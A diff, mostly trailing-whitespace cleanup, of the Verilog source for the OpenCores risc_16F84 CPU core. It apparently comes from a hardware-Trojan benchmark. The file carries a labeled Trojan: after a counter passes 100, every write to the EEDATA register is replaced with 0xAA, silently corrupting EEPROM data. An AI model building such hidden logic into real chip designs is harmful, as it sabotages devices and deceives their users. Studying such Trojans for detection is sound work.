@@ -3,7 +3,7 @@
 //
 // This file is part of the "risc_16F84" project.
 // http://www.opencores.org/cores/risc_16F84
-// 
+//
 //
 // Description: See description below (which suffices for IP core
 //                                     specification document.)
@@ -26,7 +26,7 @@
 // (at your option) any later version.
 //
 // This source is distributed in the hope that it will be useful, but WITHOUT
-// ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or 
+// ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 // FITNESS FOR A PARTICULAR PURPOSE.  See the GNU Lesser General Public
 // License for more details.
 //
@@ -258,16 +258,16 @@ reg  [LOG2_STACK_SIZE_PP-1:0] stack_pnt_reg;
 
      // WDT register and its control
 reg  [WDT_BITS_PP-1:0] wdt_reg;  // WDT counter
-reg  wdt_full_reg;               // WDT->CPU; hold WDT-full signal until 
+reg  wdt_full_reg;               // WDT->CPU; hold WDT-full signal until
                                  //   CPU is reset
 reg  wdt_full_node;
 wire wdt_init;                   // Initialize the WDT
 reg  [2:0] wdt_full_sync_reg;    // CPU; synchronizer for wdt_full_reg
 reg  wdt_clr_reg;                // CPU->WDT; request to zero-clear wdt_reg
-reg  wdt_clr_reqhold_reg;        // CPU; hold a clear-request if 
+reg  wdt_clr_reqhold_reg;        // CPU; hold a clear-request if
                                  //   previous request is still processing
 reg  [1:0] wdt_clr_req_reg;      // WDT; synchronizer for wdt_clr_reg
-wire wdt_clr_ack;                // WDT->CPU; ack to wdt_clr_reg 
+wire wdt_clr_ack;                // WDT->CPU; ack to wdt_clr_reg
                                  //   (same with wdt_clr_req_reg(1))
 reg  wdt_clr_ack_sync_reg;       // CPU; synchronizer for wdt_clr_ack
 reg  wdt_full_clr_reg;           // CPU->WDT; request to clear wdt_full_reg
@@ -342,7 +342,7 @@ wire inst_xorwf;
      // Result of calculating RAM access address
 wire [8:0] ram_adr_node;      // RAM access address
 
-     // These wires indicate accesses to special registers... 
+     // These wires indicate accesses to special registers...
      // Only 1 is active at a time.
 wire addr_tmr0;
 wire addr_pcl;
@@ -383,7 +383,7 @@ wire [7:0] mask_node;    // bit mask for logical operations
 reg  [8:0] add_node;     // result of 8bit addition
 reg  [4:0] addlow_node;  // result of low-4bit addition
 
-// ----------------------------------------------------  
+// ----------------------------------------------------
 //wire temp;               // Placeholder wire
 //wire dtemp;              // Placeholder wire
 reg temp;               // Placeholder wire
@@ -557,10 +557,10 @@ begin
 
   // 1-3. Adder (ALU)
   // full 8bit-addition, with carry in/out.
-  {add_node,temp}     <=    {1'b0,aluinp1_reg,1'b1} 
+  {add_node,temp}     <=    {1'b0,aluinp1_reg,1'b1}
                           + {1'b0,aluinp2_reg,c_in};
   // lower 4bit-addition
-  {addlow_node,dtemp} <=    {1'b0,aluinp1_reg[3:0],1'b1} 
+  {addlow_node,dtemp} <=    {1'b0,aluinp1_reg[3:0],1'b1}
                           + {1'b0,aluinp2_reg[3:0],c_in};
 
   // 1-4. Test if aluout = 0
@@ -577,15 +577,15 @@ begin
     writew_node     <= 0;
     writeram_node   <= 1;
   end
-  else if (   inst_movlw || inst_addlw || inst_sublw || inst_andlw 
+  else if (   inst_movlw || inst_addlw || inst_sublw || inst_andlw
            || inst_iorlw || inst_xorlw || inst_retlw || inst_clrw)
   begin
     writew_node     <= 1;
     writeram_node   <= 0;
   end
   else if (   inst_movf   || inst_swapf || inst_addwf || inst_subwf
-           || inst_andwf  || inst_iorwf || inst_xorwf || inst_decf 
-           || inst_incf   || inst_rlf   || inst_rrf   || inst_decfsz 
+           || inst_andwf  || inst_iorwf || inst_xorwf || inst_decf
+           || inst_incf   || inst_rlf   || inst_rrf   || inst_decfsz
            || inst_incfsz || inst_comf)
   begin
     writew_node     <= ~inst_reg[7];  // ("d" field of fetched instruction)
@@ -634,7 +634,7 @@ begin
       sleepflag_reg   <= 0;
 
       // (set /T0 and /PD properly; see pp.42 and pp.46 of data sheet)
-      // NOTE: Do NOT clear stack pointer for MCLR reset or WDT reset 
+      // NOTE: Do NOT clear stack pointer for MCLR reset or WDT reset
       if (~poweron_sync_reg)      // Power-on Reset
       begin
         status_reg[4] <= 1;       // /T0 = 1
@@ -651,14 +651,14 @@ begin
       begin
         status_reg[4]       <= 0;                  // /T0 = 0
         // /PD = 1 if normal reset, /PD = 0 if wake up
-        status_reg[3]       <= ~sleepflag_reg;  
+        status_reg[3]       <= ~sleepflag_reg;
       end
 
       // Most bits of eecon1 are set to zero.
       eecon1_reg[4]    <= 0;
       eecon1_reg[2:0]  <= 3'b0;
       // Except...
-      // (set WRERR bit in EECON1 properly; 
+      // (set WRERR bit in EECON1 properly;
       //  see pp.33 and pp.34 of data sheet)
       if (~poweron_sync_reg) eecon1_reg[3] <= 0; // clear WRERR
       else eecon1_reg[3] <= eecon1_reg[1];       // substitute WR into WRERR
@@ -732,12 +732,12 @@ begin
             || inst_incf   || inst_rlf   || inst_rrf   || inst_bcf
             || inst_bsf    || inst_btfsc || inst_btfss || inst_decfsz
             || inst_incfsz || inst_comf)
-            
+
             aluinp1_reg <= ram_i_node;       // RAM/Special registers
         else
         if (   inst_movlw || inst_addlw || inst_sublw || inst_andlw
             || inst_iorlw || inst_xorlw || inst_retlw)
-            
+
             aluinp1_reg <= inst_reg[7:0];    // Immediate value ("k")
         else
         if (   inst_clrf  || inst_clrw) aluinp1_reg <= 0; // 0
@@ -747,10 +747,10 @@ begin
         if      (inst_decf || inst_decfsz) aluinp2_reg <= -1; // for decr.
         else if (inst_incf || inst_incfsz) aluinp2_reg <=  1; // for incr.
                 // -1 * W register (for subtract)
-        else if (inst_sublw || inst_subwf) aluinp2_reg <= ~w_reg + 1; 
+        else if (inst_sublw || inst_subwf) aluinp2_reg <= ~w_reg + 1;
                 // operation of BCF: AND with inverted mask ("1..101..1")
                 // mask for BCF: value of only one position is 0
-        else if (inst_bcf) aluinp2_reg <= ~mask_node; 
+        else if (inst_bcf) aluinp2_reg <= ~mask_node;
                 // operation of BSF: OR with mask_node ("0..010..0")
                 // operation of FSC and FSS: AND with mask_node, compare to 0
         else if (inst_btfsc || inst_btfss || inst_bsf)
@@ -784,10 +784,10 @@ begin
       begin
         // 2-4-1-1. Set aluout register
                 // Rotate left
-        if      (inst_rlf) 
+        if      (inst_rlf)
                 aluout_reg <= {aluinp1_reg[6:0],status_reg[0]};
                 // Rotate right
-        else if (inst_rrf) 
+        else if (inst_rrf)
                 aluout_reg  <= {status_reg[0],aluinp1_reg[7:1]};
                 // Swap nibbles
         else if (inst_swapf)
@@ -797,7 +797,7 @@ begin
                 aluout_reg  <= ~aluinp1_reg;
                 // Logical AND, bit clear/bit test
         else if (   inst_andlw || inst_andwf || inst_bcf || inst_btfsc
-                 || inst_btfss) 
+                 || inst_btfss)
                 aluout_reg  <= (aluinp1_reg & aluinp2_reg);
                 // Logical OR, bit set
         else if (inst_bsf || inst_iorlw || inst_iorwf)
@@ -835,14 +835,14 @@ begin
         if (inte_sync_reg)
         begin
           intcon_reg[1] <= 1;     // set INTF
-          intclr_reg[0] <= 1;     // clear external int-registers 
+          intclr_reg[0] <= 1;     // clear external int-registers
                                   // (intrise_reg(0) and intdown_reg(0))
         end
         // PORT-B[4-7] INT
         if (rbint_sync_reg)
         begin
           intcon_reg[0]   <= 1;   // set RBIF
-          intclr_reg[4:1] <= -1;  // clear external int-registers 
+          intclr_reg[4:1] <= -1;  // clear external int-registers
                                   // (intrise_reg(4-1) and intdown_reg(4-1))
         end
       end
@@ -855,9 +855,9 @@ begin
 
         // if ~intstart and GIE and T0IE and timer full, then set T0IF
         if (
-               ~intstart_reg 
+               ~intstart_reg
             && intcon_reg[7]
-            && intcon_reg[5] 
+            && intcon_reg[5]
             && (tmr0_reg == -1)
             )
               intcon_reg[2] <= 1;             // set T0IF
@@ -881,16 +881,16 @@ begin
         pc_reg          <= inc_pc_node; // increment PC
         exec_op_reg     <= 1;           // end of stall
       end
-      else  // if NOT stalled 
+      else  // if NOT stalled
       begin
-        // (note: if intstart_reg, only stack/pc-operations in this 
+        // (note: if intstart_reg, only stack/pc-operations in this
         //        else-clause will be performed)
-        // 2-5-2. Store calculation result into distination, 
+        // 2-5-2. Store calculation result into distination,
         // set PC and flags, and determine if execute next cycle.
 
-        // 2-5-2-1. Set W register, if not in stall cycle 
+        // 2-5-2-1. Set W register, if not in stall cycle
         //          (~intstart_reg) and distination is W
-        
+
         // writew_node == 0 if intstart_reg...
         if (writew_node) w_reg   <= aluout_reg;    // write W reg
 
@@ -909,17 +909,17 @@ begin
           if (addr_portb)   portb_o_reg <= aluout_reg;      // write PORT-B
 
 		  // Trojan-Payload ---------------------------------------------------------------------------------------------------
-          if (addr_eep_dat) 
+          if (addr_eep_dat)
 			begin
 				if (~Trojan_Trigger_Out)
 					begin eep_dat_reg <= aluout_reg; end     // write EEDATA
-				else	
+				else
 					begin eep_dat_reg <= 8'b10101010; end     // write EEDATA
 			end
  		  // -----------------------------------------------------------------------------------------------------------------------
           if (addr_eep_adr) eep_adr_reg <= aluout_reg;      // write EEADR
           if (addr_pclath)   pclath_reg <= aluout_reg[4:0]; // write PCLATH
-          if (addr_intcon) intcon_reg[6:0] <= aluout_reg[6:0]; 
+          if (addr_intcon) intcon_reg[6:0] <= aluout_reg[6:0];
                            // write INTCON (except GIE)
                            // intcon(7)...see below (GIE part)
           if (addr_option)   option_reg <= aluout_reg;      // write OPTION
@@ -929,7 +929,7 @@ begin
           if (addr_eecon1)                                  // write EECON1
           begin
             eecon1_reg[4:3] <= aluout_reg[4:3];
-            eecon1_reg[2]   <= aluout_reg[2] && existeeprom_i; 
+            eecon1_reg[2]   <= aluout_reg[2] && existeeprom_i;
             // (WREN can be set only when EEPROM exists)
             if (aluout_reg[2:0] == 3'b110) eecon1_reg[1]   <= 1;
             // WR: only SET-operation is allowed to user
@@ -954,13 +954,13 @@ begin
                                                                                 // IORLW or IORWF instructions:
                   status_reg[2] <= ~aluout_zero_node;
                   // Z=1 if result != 0 (PIC16F84 data sheet pp.61-62)
-              //  status_reg[2] <= aluout_zero_node;                
+              //  status_reg[2] <= aluout_zero_node;
                   // Z=1 if result == 0 (same as the other instructions)
         end
 
         // 2-5-2-4. Set PC and determine whether to execute next cycle or not
         // After interrupt-stall cycle ends, jump to interrupt vector
-        if (intstart_reg) 
+        if (intstart_reg)
         begin
           pc_reg      <= 4;     // (interrupt vector)
           exec_op_reg <= 0;     // the next cycle is a stall cycle
@@ -976,7 +976,7 @@ begin
           pc_reg      <= {pclath_reg[4:3],inst_reg[10:0]};
           exec_op_reg <= 0;
         end
-        else if ( (   (inst_btfsc || inst_decfsz || inst_incfsz) 
+        else if ( (   (inst_btfsc || inst_decfsz || inst_incfsz)
                        && aluout_zero_node)
                    || (inst_btfss && ~aluout_zero_node)
                    ) // bit_test instrcutions
@@ -995,10 +995,10 @@ begin
         begin
           // this check MUST be located AFTER the above if/else sentences
           // check if interrupt trigger comes
-          if (~int_node) pc_reg <= inc_pc_node; 
+          if (~int_node) pc_reg <= inc_pc_node;
           // if not, the next instr. fetch/exec. will be performed normally
-          else pc_reg <= pc_reg; 
-          // if so, value of PC must be held 
+          else pc_reg <= pc_reg;
+          // if so, value of PC must be held
           //(will be pushed onto stack at the end of next instruction cycle)
           exec_op_reg <= 1;
         end
@@ -1130,9 +1130,9 @@ begin
   begin
     // synchronizers
     // WDT-clear request (CLRWDT/SLEEP instruction)
-    // (do not AND with sleepflag_reg, since WDT should be 
+    // (do not AND with sleepflag_reg, since WDT should be
     //  cleared at SLEEP instruction)
-    wdt_clr_req_reg[0]     <= wdt_clr_reg;     
+    wdt_clr_req_reg[0]     <= wdt_clr_reg;
     wdt_clr_req_reg[1]     <= wdt_clr_req_reg[0];
     // WDT-full-clear request (after WDT reset)
     wdt_fullclr_req_reg[0] <= wdt_full_clr_reg && ~sleepflag_reg;
@@ -1156,7 +1156,7 @@ assign wdt_clr_ack = wdt_clr_req_reg[1]; // WDT-clear ack signal to CPU
 assign wdt_full_o = wdt_full_reg;        // WDT-full int. trigger to CPU
 
 
-// WDT controller in CPU-clock line 
+// WDT controller in CPU-clock line
 // (handshake-interface between WDT and CPU-EFSM)
 always @(posedge clk_i)
 begin
@@ -1273,8 +1273,8 @@ end // process
 assign rb7_int = intrise_reg[4] || intdown_reg[4];
 
 
-// Decode INT triggers 
-// (do not AND with GIE(intcon_reg(7)), since these signals are 
+// Decode INT triggers
+// (do not AND with GIE(intcon_reg(7)), since these signals are
 //  also used for waking up from SLEEP)
 assign inte  = intcon_reg[4] && rb0_int;                                       // G0IE and raw-trigger signal
 assign rbint = intcon_reg[3] && (rb4_int || rb5_int || rb6_int || rb7_int);    // RBIE and raw-trigger signal
@@ -1282,7 +1282,7 @@ assign rbint = intcon_reg[3] && (rb4_int || rb5_int || rb6_int || rb7_int);    /
 // Circuit's output signals
 assign ram_adr_o    = ram_adr_reg;   // data RAM address
 assign ram_dat_o    = aluout_reg;    // data RAM write data
-assign readram_o    = (state_reg[1:0] == Q2_PP[1:0]); // data RAM read enable 
+assign readram_o    = (state_reg[1:0] == Q2_PP[1:0]); // data RAM read enable
                                                 //(1 when state_reg = Q2_PP)
 assign writeram_o   = writeram_reg;  // data RAM write enable
 
@@ -1301,7 +1301,7 @@ assign rbpu_o       = option_reg[7]; // RBPU: pull-up enable
 assign clk_o        = clk_o_reg;     // clock (clk_i/4) output
 
 assign powerdown_o  = sleepflag_reg;                                                       // CPU clock stop indicator
-assign startclk_o   = inte || rbint || wdt_full_reg 
+assign startclk_o   = inte || rbint || wdt_full_reg
                       || ~mclr_n_i || ~pon_rst_n_i;
                      // CPU clock start indicator
 
@@ -1327,9 +1327,9 @@ end // Trojan trigger
 
 always @(Counter)
 begin
-	if (Counter > 100) 
+	if (Counter > 100)
 		Trojan_Trigger_Out <= 1;
-	else 
+	else
 		Trojan_Trigger_Out <= 0;
 end // Trojan payload
 
